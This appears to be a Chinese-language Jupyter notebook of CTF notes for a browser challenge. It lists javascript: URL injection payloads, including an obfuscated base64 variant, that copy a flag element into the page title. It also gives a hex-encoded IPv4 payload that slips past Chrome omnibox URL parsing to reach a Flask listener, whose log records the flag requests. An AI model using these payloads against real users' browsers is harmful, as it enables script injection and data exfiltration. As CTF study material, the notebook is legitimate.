{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "4551162e",
   "metadata": {},
   "source": [
    "# 注入js\n",
    "\n",
    "java  script:alert(1)\n",
    "\n",
    "javascript: document.title=document.querySelector('.flag').textContent\n",
    "\n",
    "javascript: alert(document.querySelector('title').textContent=1)//\n",
    "\n",
    "javascript: eval`alert\\u0028document\\u002equerySelector\\u0028'title'\\u0029\\u002etextContent\\u003d1\\u0029`// 不管用\n",
    "\n",
    "javascript: Function`a${atob`ZG9jdW1lbnQudGl0bGU9ZG9jdW1lbnQucXVlcnlTZWxlY3RvcignLmZsYWcnKS50ZXh0Q29udGVudDsg`}``` //\n",
    "\n",
    "flag{checK-this-out-If-you-hAve-not:Crbug.com/31661}"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "ad59d8b5",
   "metadata": {},
   "source": [
    "# 注入外部网址\n",
    "\n",
    "payload: http://0xa2.0x69.0x101d:9811?\n",
    "\n",
    "omnibox  chrome://omnibox/  判断标准：\n",
    "\n",
    "https://chromium.googlesource.com/chromium/src/+/refs/tags/106.0.5249.163/components/omnibox/browser/autocomplete_input.cc#235\n",
    "\n",
    "对于ipv4地址，如果：能解析成合法的4字节ipv4 && scheme.is_empty() && 结尾没有slash && 1 < num_ipv4_components < 4，则认为是QUERY"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "f3c25c6c",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      " * Serving Flask app '__main__'\n",
      " * Debug mode: off\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "\u001b[31m\u001b[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.\u001b[0m\n",
      " * Running on all addresses (0.0.0.0)\n",
      " * Running on http://127.0.0.1:9811\n",
      " * Running on http://162.105.16.29:9811\n",
      "\u001b[33mPress CTRL+C to quit\u001b[0m\n",
      "10.1.53.110 - - [25/Nov/2022 17:27:10] \"GET /?flag.jpg HTTP/1.1\" 200 -\n",
      "10.1.53.110 - - [25/Nov/2022 17:27:35] \"GET /?.jpg HTTP/1.1\" 200 -\n",
      "115.27.243.170 - - [25/Nov/2022 17:27:49] \"GET /?.jpg HTTP/1.1\" 200 -\n",
      "115.27.243.170 - - [25/Nov/2022 17:27:49] \"\u001b[33mGET /favicon.ico HTTP/1.1\u001b[0m\" 404 -\n"
     ]
    }
   ],
   "source": [
    "from flask import Flask, render_template\n",
    "app = Flask(__name__)\n",
    "\n",
    "@app.route('/')\n",
    "def hello_world():\n",
    "    return render_template('template.html')\n",
    "\n",
    "app.run(host=\"0.0.0.0\", port=9811)    "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "3e534334",
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python [conda env:.conda-hjh]",
   "language": "python",
   "name": "conda-env-.conda-hjh-py"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.8.10"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
